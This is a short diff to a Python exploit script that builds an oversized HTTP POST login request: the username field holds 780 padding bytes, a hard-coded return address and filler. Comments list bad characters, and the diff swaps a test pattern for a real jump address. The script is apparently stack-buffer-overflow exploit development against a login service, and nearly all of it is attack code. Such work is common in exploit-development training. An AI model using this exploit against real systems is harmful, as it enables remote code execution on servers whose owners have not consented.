@@ -1,6 +1,7 @@
 import socket
-import time
-buffer="A"*780+'BBBB'+'C'*(800-780-4) 
+# badchars is "\x00\x0a\xad\x25\x26\x2b\x3d"
+# Message 0x1009083
+buffer='A'*780+"\x83\x0c\x09\x10"+'C'*(1500-780-4) 
 payload="username="+buffer+ "&password=1234"
 request=""
 request+="POST /login HTTP/1.1\r\n"
